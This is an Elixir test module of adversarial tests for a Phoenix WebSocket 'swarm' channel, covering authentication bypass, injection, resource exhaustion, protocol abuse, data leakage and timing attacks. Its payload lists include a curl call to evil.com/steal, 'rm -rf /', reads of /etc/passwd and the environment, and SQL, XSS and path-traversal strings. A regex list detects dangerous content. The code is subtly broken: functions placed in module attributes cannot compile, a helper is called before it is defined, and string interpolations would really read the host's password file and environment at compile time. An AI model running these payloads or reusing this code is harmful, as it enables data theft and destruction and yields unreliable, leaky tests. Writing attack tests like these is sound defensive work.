defmodule CnsWeb.Channels.AdversarialTest do
  @moduledoc """
  Adversarial tests for ultrathink 80/20 swarm channels.
  Tests security vulnerabilities, attack vectors, and edge cases.
  """
  
  use CnsWeb.ChannelCase
  use ExUnit.Case, async: false
  
  alias CnsWeb.{SwarmChannel, UserSocket}
  alias Cns.{Accounts, Swarm}
  
  # Attack payloads for testing
  @malicious_payloads [
    # Code injection attempts
    %{"code" => "System.cmd(\"rm\", [\"-rf\", \"/\"])"},
    %{"eval" => ":os.cmd('curl http://evil.com/steal')"},
    %{"function" => fn -> File.rm_rf!("/etc") end},
    
    # Data exfiltration attempts
    %{"extract" => "#{File.read!("/etc/passwd")}"},
    %{"leak" => %{"secrets" => "#{System.get_env()}"}},
    
    # Memory exhaustion
    %{"large_data" => String.duplicate("A", 10_000_000)},
    %{"infinite_list" => Stream.iterate(0, &(&1 + 1)) |> Enum.take(1_000_000)},
    
    # Protocol exploitation
    %{"__proto__" => %{"admin" => true}},
    %{"constructor" => %{"prototype" => %{"isAdmin" => true}}},
    
    # SQL/NoSQL injection attempts
    %{"query" => "'; DROP TABLE users; --"},
    %{"filter" => %{"$ne" => nil}},
    
    # XSS attempts
    %{"message" => "<script>alert('xss')</script>"},
    %{"title" => "javascript:alert('xss')"},
    
    # Path traversal
    %{"file" => "../../../../etc/passwd"},
    %{"path" => "..\\..\\..\\windows\\system32\\config\\sam"}
  ]
  
  @oversized_payloads [
    %{"huge_string" => String.duplicate("X", 2_000_000)},
    %{"huge_list" => List.duplicate("item", 100_000)},
    %{"deep_nesting" => create_deep_nested_map(1000)},
    %{"huge_binary" => :crypto.strong_rand_bytes(5_000_000)}
  ]
  
  setup do
    # Create attacker user (limited privileges)
    attacker_user = %{
      id: 999,
      email: "attacker@malicious.com", 
      role: "user",  # Not admin
      active: true
    }
    
    # Create admin user for comparison
    admin_user = %{
      id: 1,
      email: "admin@secure.com",
      role: "admin",
      active: true
    }
    
    # Create test swarm
    swarm = %{
      id: "adversarial-test-swarm",
      name: "Adversarial Test Swarm",
      optimization_mode: "80_20"
    }
    
    {:ok, %{attacker_user: attacker_user, admin_user: admin_user, swarm: swarm}}
  end
  
  describe "Authentication and Authorization Attacks" do
    test "prevents unauthorized access without token", %{swarm: swarm} do
      # Attempt to connect without token
      assert connect(UserSocket, %{}) == :error
      assert connect(UserSocket, %{"invalid" => "data"}) == :error
      assert connect(UserSocket, %{"token" => "invalid_token"}) == :error
    end
    
    test "prevents privilege escalation through payload manipulation", %{attacker_user: attacker_user, swarm: swarm} do
      {:ok, socket} = connect(UserSocket, %{
        "token" => Phoenix.Token.sign(CnsWeb.Endpoint, "user socket", attacker_user.id),
        "optimization" => "80_20"
      })
      
      {:ok, _response, channel_socket} = subscribe_and_join(
        socket,
        SwarmChannel,
        "swarm:#{swarm.id}",
        %{"optimization" => "80_20"}
      )
      
      # Attempt admin-only operations
      admin_operations = [
        {"optimize:mode:set", %{"mode" => "full"}},
        {"optimize:threshold:adjust", %{"type" => "cpu", "value" => 95}},
        {"optimize:strategy:apply", %{"strategy" => "skip_stages"}},
        {"optimize:report:generate", %{"type" => "comprehensive"}}
      ]
      
      Enum.each(admin_operations, fn {event, payload} ->
        ref = push(channel_socket, event, payload)
        
        # Should be rejected with permission error
        assert_reply ref, :error, error
        assert error.reason in ["Admin access required", "Insufficient permissions"]
      end)
    end
    
    test "prevents session hijacking through token manipulation", %{attacker_user: attacker_user, swarm: swarm} do
      # Create valid token for attacker
      valid_token = Phoenix.Token.sign(CnsWeb.Endpoint, "user socket", attacker_user.id)
      
      # Attempt to modify token to gain admin access
      malicious_tokens = [
        Phoenix.Token.sign(CnsWeb.Endpoint, "user socket", 1),  # Admin user ID
        String.replace(valid_token, "user", "admin"),
        valid_token <> "admin",
        Base.encode64("admin:#{valid_token}")
      ]
      
      Enum.each(malicious_tokens, fn token ->
        case connect(UserSocket, %{"token" => token}) do
          {:ok, socket} ->
            # If connection succeeds, verify user is not escalated
            assert socket.assigns.current_user.id == attacker_user.id
            assert socket.assigns.current_user.role == "user"
          :error ->
            # Expected for invalid tokens
            :ok
        end
      end)
    end
    
    test "prevents cross-swarm access violations", %{attacker_user: attacker_user} do
      {:ok, socket} = connect(UserSocket, %{
        "token" => Phoenix.Token.sign(CnsWeb.Endpoint, "user socket", attacker_user.id)
      })
      
      # Attempt to access unauthorized swarms
      unauthorized_swarms = [
        "admin-only-swarm",
        "production-swarm",
        "classified-swarm-001"
      ]
      
      Enum.each(unauthorized_swarms, fn swarm_id ->
        result = subscribe_and_join(socket, SwarmChannel, "swarm:#{swarm_id}")
        
        # Should be rejected
        assert {:error, %{reason: reason}} = result
        assert reason in ["Swarm access denied", "Authentication required", "Invalid topic"]
      end)
    end
  end
  
  describe "Payload Injection Attacks" do
    test "sanitizes malicious code injection attempts", %{attacker_user: attacker_user, swarm: swarm} do
      {:ok, socket} = connect(UserSocket, %{
        "token" => Phoenix.Token.sign(CnsWeb.Endpoint, "user socket", attacker_user.id)
      })
      
      {:ok, _response, channel_socket} = subscribe_and_join(
        socket,
        SwarmChannel,
        "swarm:#{swarm.id}"
      )
      
      # Test each malicious payload
      Enum.each(@malicious_payloads, fn malicious_payload ->
        ref = push(channel_socket, "pipeline:execute", malicious_payload)
        
        # Should either sanitize or reject
        case assert_reply(ref, _, response) do
          {:ok, cleaned_response} ->
            # If accepted, should be sanitized
            assert not contains_dangerous_content?(cleaned_response)
            
          {:error, error} ->
            # Should be rejected with validation error
            assert error.reason =~ "validation"
        end
      end)
    end
    
    test "prevents dangerous function execution", %{attacker_user: attacker_user, swarm: swarm} do
      {:ok, socket} = connect(UserSocket, %{
        "token" => Phoenix.Token.sign(CnsWeb.Endpoint, "user socket", attacker_user.id)
      })
      
      {:ok, _response, channel_socket} = subscribe_and_join(
        socket,
        SwarmChannel,
        "swarm:#{swarm.id}"
      )
      
      # Attempt to inject functions
      function_payloads = [
        %{"callback" => fn -> System.halt(1) end},
        %{"lambda" => &File.rm_rf!/1},
        %{"proc" => fn -> :os.cmd('rm -rf /') end}
      ]
      
      Enum.each(function_payloads, fn payload ->
        ref = push(channel_socket, "reactor:step:execute", payload)
        
        assert_reply ref, :error, error
        assert error.reason =~ "Invalid data types"
      end)
    end
    
    test "prevents atom exhaustion attacks", %{attacker_user: attacker_user, swarm: swarm} do
      {:ok, socket} = connect(UserSocket, %{
        "token" => Phoenix.Token.sign(CnsWeb.Endpoint, "user socket", attacker_user.id)
      })
      
      {:ok, _response, channel_socket} = subscribe_and_join(
        socket,
        SwarmChannel,
        "swarm:#{swarm.id}"
      )
      
      # Attempt to create many unique atoms
      atom_payloads = for i <- 1..1000 do
        %{"dynamic_atom_#{i}" => "value"}
      end
      
      Enum.each(atom_payloads, fn payload ->
        ref = push(channel_socket, "notifications:subscribe", payload)
        
        # Should handle gracefully without creating atoms
        assert_reply ref, _, _response
      end)
      
      # System should remain stable
      atom_count_before = :erlang.system_info(:atom_count)
      
      # Send more atom-like payloads
      for i <- 1001..2000 do
        ref = push(channel_socket, "telemetry:subscribe", %{"atom_#{i}" => "test"})
        assert_reply ref, _, _response
      end
      
      atom_count_after = :erlang.system_info(:atom_count)
      
      # Should not have created excessive atoms
      assert atom_count_after - atom_count_before < 100
    end
  end
  
  describe "Memory and Resource Exhaustion Attacks" do
    test "prevents memory exhaustion through large payloads", %{attacker_user: attacker_user, swarm: swarm} do
      {:ok, socket} = connect(UserSocket, %{
        "token" => Phoenix.Token.sign(CnsWeb.Endpoint, "user socket", attacker_user.id)
      })
      
      {:ok, _response, channel_socket} = subscribe_and_join(
        socket,
        SwarmChannel,
        "swarm:#{swarm.id}"
      )
      
      # Test oversized payloads
      Enum.each(@oversized_payloads, fn large_payload ->
        ref = push(channel_socket, "pipeline:execute", large_payload)
        
        # Should reject with size limit error
        assert_reply ref, :error, error
        assert error.reason =~ "Payload too large"
      end)
    end
    
    test "prevents CPU exhaustion through complex operations", %{attacker_user: attacker_user, swarm: swarm} do
      {:ok, socket} = connect(UserSocket, %{
        "token" => Phoenix.Token.sign(CnsWeb.Endpoint, "user socket", attacker_user.id)
      })
      
      {:ok, _response, channel_socket} = subscribe_and_join(
        socket,
        SwarmChannel,
        "swarm:#{swarm.id}"
      )
      
      # Attempt resource-intensive operations rapidly
      start_time = :os.system_time(:millisecond)
      
      # Send many complex requests
      refs = for i <- 1..100 do
        push(channel_socket, "pipeline:execute", %{
          "strategy" => "custom",
          "stages" => List.duplicate("complex_stage_#{i}", 50),
          "complex_data" => create_complex_nested_structure(100)
        })
      end
      
      # Should rate limit or reject
      error_count = Enum.count(refs, fn ref ->
        case assert_reply(ref, _, response) do
          {:error, %{reason: reason}} when reason =~ "rate limit" -> true
          {:error, %{reason: reason}} when reason =~ "validation" -> true
          _ -> false
        end
      end)
      
      # Should have rejected many requests
      assert error_count > 50
      
      end_time = :os.system_time(:millisecond)
      duration = end_time - start_time
      
      # Should not take excessive time
      assert duration < 5000  # Less than 5 seconds
    end
    
    test "prevents process spawning attacks", %{attacker_user: attacker_user, swarm: swarm} do
      {:ok, socket} = connect(UserSocket, %{
        "token" => Phoenix.Token.sign(CnsWeb.Endpoint, "user socket", attacker_user.id)
      })
      
      {:ok, _response, channel_socket} = subscribe_and_join(
        socket,
        SwarmChannel,
        "swarm:#{swarm.id}"
      )
      
      initial_process_count = :erlang.system_info(:process_count)
      
      # Attempt to spawn many processes through workflow execution
      refs = for i <- 1..50 do
        push(channel_socket, "reactor:workflow:execute", %{
          "workflow_id" => "spawn_attack_#{i}",
          "input" => %{"spawn_processes" => true}
        })
      end
      
      # Wait for processing
      Process.sleep(1000)
      
      final_process_count = :erlang.system_info(:process_count)
      process_increase = final_process_count - initial_process_count
      
      # Should not have spawned excessive processes
      assert process_increase < 100
    end
  end
  
  describe "WebSocket Protocol Attacks" do
    test "prevents websocket frame manipulation attacks" do
      # Test raw WebSocket connection attempts
      {:ok, socket} = :gun.open('localhost', 4002, %{protocols: [:http]})
      {:ok, :http} = :gun.await_up(socket)
      
      # Attempt to send malformed frames
      malformed_frames = [
        # Oversized frame
        String.duplicate("A", 1_000_000),
        # Malformed JSON
        "{invalid json",
        # Binary bomb
        :zlib.compress(String.duplicate("A", 10_000_000))
      ]
      
      Enum.each(malformed_frames, fn frame ->
        stream_ref = :gun.ws_upgrade(socket, "/socket/websocket")
        
        case :gun.await(socket, stream_ref) do
          {:response, :fin, 101, _headers} ->
            # Connection upgraded, try to send malformed frame
            :gun.ws_send(socket, stream_ref, {:text, frame})
            
            # Should disconnect or reject gracefully
            receive do
              {:gun_ws, ^socket, ^stream_ref, :close} -> :ok
              {:gun_ws, ^socket, ^stream_ref, {:error, _}} -> :ok
            after
              1000 -> :timeout  # Expected if frame is rejected
            end
            
          {:response, :fin, status, _headers} ->
            # Connection rejected - expected
            assert status >= 400
        end
      end)
      
      :gun.close(socket)
    end
    
    test "prevents connection flooding attacks" do
      # Attempt to create many connections rapidly
      connection_attempts = for _i <- 1..50 do
        Task.async(fn ->
          case connect(UserSocket, %{
            "token" => Phoenix.Token.sign(CnsWeb.Endpoint, "user socket", 999)
          }) do
            {:ok, _socket} -> :success
            :error -> :failed
          end
        end)
      end
      
      results = Task.await_many(connection_attempts, 5000)
      
      # Should have rate limited connections
      failed_count = Enum.count(results, &(&1 == :failed))
      assert failed_count > 0
    end
    
    test "prevents message bombing attacks", %{attacker_user: attacker_user, swarm: swarm} do
      {:ok, socket} = connect(UserSocket, %{
        "token" => Phoenix.Token.sign(CnsWeb.Endpoint, "user socket", attacker_user.id)
      })
      
      {:ok, _response, channel_socket} = subscribe_and_join(
        socket,
        SwarmChannel,
        "swarm:#{swarm.id}"
      )
      
      # Send rapid-fire messages
      start_time = :os.system_time(:millisecond)
      
      refs = for i <- 1..1000 do
        push(channel_socket, "telemetry:subscribe", %{"spam_id" => i})
      end
      
      # Count rate limit errors
      rate_limited = Enum.count(refs, fn ref ->
        case assert_reply(ref, _, response) do
          {:error, %{reason: reason}} when reason =~ "rate limit" -> true
          _ -> false
        end
      end)
      
      end_time = :os.system_time(:millisecond)
      duration = end_time - start_time
      
      # Should have rate limited many messages
      assert rate_limited > 500
      
      # Should not have taken excessive time
      assert duration < 10_000
    end
  end
  
  describe "Data Exfiltration Prevention" do
    test "prevents sensitive data leakage through error messages", %{attacker_user: attacker_user, swarm: swarm} do
      {:ok, socket} = connect(UserSocket, %{
        "token" => Phoenix.Token.sign(CnsWeb.Endpoint, "user socket", attacker_user.id)
      })
      
      {:ok, _response, channel_socket} = subscribe_and_join(
        socket,
        SwarmChannel,
        "swarm:#{swarm.id}"
      )
      
      # Attempt to trigger errors that might leak data
      error_inducing_payloads = [
        %{"file" => "/etc/passwd"},
        %{"database" => "SELECT * FROM secrets"},
        %{"env" => "${DATABASE_PASSWORD}"},
        %{"config" => "show_internal_config"}
      ]
      
      Enum.each(error_inducing_payloads, fn payload ->
        ref = push(channel_socket, "pipeline:execute", payload)
        
        case assert_reply(ref, _, response) do
          {:error, error} ->
            # Error messages should not contain sensitive data
            error_text = inspect(error)
            refute error_text =~ ~r/password|secret|key|token/i
            refute error_text =~ ~r/\/etc\/|\/var\/|c:\\/i
            refute error_text =~ ~r/database|sql|mongo/i
            
          {:ok, _} ->
            # If successful, response should not contain sensitive data
            :ok
        end
      end)
    end
    
    test "prevents internal state exposure", %{attacker_user: attacker_user, swarm: swarm} do
      {:ok, socket} = connect(UserSocket, %{
        "token" => Phoenix.Token.sign(CnsWeb.Endpoint, "user socket", attacker_user.id)
      })
      
      {:ok, _response, channel_socket} = subscribe_and_join(
        socket,
        SwarmChannel,
        "swarm:#{swarm.id}"
      )
      
      # Attempt to access internal state
      state_access_attempts = [
        {"pipeline:status", %{"include_internal" => true}},
        {"telemetry:metrics:get", %{"internal_metrics" => true}},
        {"optimize:report:generate", %{"include_secrets" => true}}
      ]
      
      Enum.each(state_access_attempts, fn {event, payload} ->
        ref = push(channel_socket, event, payload)
        
        case assert_reply(ref, _, response) do
          {:ok, data} ->
            # Should not contain internal state
            data_text = inspect(data)
            refute data_text =~ ~r/#PID|#Reference|#Function/
            refute data_text =~ ~r/assigns|state|private/i
            
          {:error, _} ->
            # Expected for unauthorized access
            :ok
        end
      end)
    end
  end
  
  describe "Timing and Side-Channel Attacks" do
    test "prevents timing-based user enumeration", %{swarm: swarm} do
      # Test authentication timing for valid vs invalid users
      valid_user_times = for _i <- 1..10 do
        start_time = :os.system_time(:microsecond)
        
        connect(UserSocket, %{
          "token" => Phoenix.Token.sign(CnsWeb.Endpoint, "user socket", 1)
        })
        
        end_time = :os.system_time(:microsecond)
        end_time - start_time
      end
      
      invalid_user_times = for _i <- 1..10 do
        start_time = :os.system_time(:microsecond)
        
        connect(UserSocket, %{
          "token" => "invalid_token_#{:rand.uniform(1000)}"
        })
        
        end_time = :os.system_time(:microsecond)
        end_time - start_time
      end
      
      avg_valid_time = Enum.sum(valid_user_times) / length(valid_user_times)
      avg_invalid_time = Enum.sum(invalid_user_times) / length(invalid_user_times)
      
      # Times should be similar to prevent enumeration
      time_difference_ratio = abs(avg_valid_time - avg_invalid_time) / avg_valid_time
      assert time_difference_ratio < 0.5  # Less than 50% difference
    end
    
    test "prevents optimization state inference through timing", %{attacker_user: attacker_user, swarm: swarm} do
      {:ok, socket} = connect(UserSocket, %{
        "token" => Phoenix.Token.sign(CnsWeb.Endpoint, "user socket", attacker_user.id)
      })
      
      {:ok, _response, channel_socket} = subscribe_and_join(
        socket,
        SwarmChannel,
        "swarm:#{swarm.id}"
      )
      
      # Measure timing for different operations
      operation_times = for operation <- ["pipeline:execute", "reactor:step:execute", "telemetry:subscribe"] do
        times = for _i <- 1..5 do
          start_time = :os.system_time(:microsecond)
          
          ref = push(channel_socket, operation, %{"probe" => true})
          assert_reply ref, _, _response
          
          end_time = :os.system_time(:microsecond)
          end_time - start_time
        end
        
        {operation, Enum.sum(times) / length(times)}
      end
      
      # Timing variations should not reveal internal state
      max_time = operation_times |> Enum.map(fn {_, time} -> time end) |> Enum.max()
      min_time = operation_times |> Enum.map(fn {_, time} -> time end) |> Enum.min()
      
      # Should not have extreme timing differences that reveal optimization state
      timing_ratio = max_time / min_time
      assert timing_ratio < 10  # Less than 10x difference
    end
  end
  
  # Helper functions
  
  defp create_deep_nested_map(depth) when depth <= 0, do: %{"end" => true}
  defp create_deep_nested_map(depth) do
    %{"level_#{depth}" => create_deep_nested_map(depth - 1)}
  end
  
  defp create_complex_nested_structure(size) do
    %{
      "lists" => for(i <- 1..size, do: "item_#{i}"),
      "maps" => for(i <- 1..size, into: %{}, do: {"key_#{i}", "value_#{i}"}),
      "nested" => %{
        "deep" => %{
          "structure" => List.duplicate(%{"data" => "value"}, size)
        }
      }
    }
  end
  
  defp contains_dangerous_content?(data) do
    data_string = inspect(data)
    
    dangerous_patterns = [
      ~r/System\./,
      ~r/:os\./,
      ~r/File\./,
      ~r/Process\./,
      ~r/__proto__|constructor/,
      ~r/rm -rf|del \/|format c:/i,
      ~r/<script|javascript:|data:/i
    ]
    
    Enum.any?(dangerous_patterns, &Regex.match?(&1, data_string))
  end
end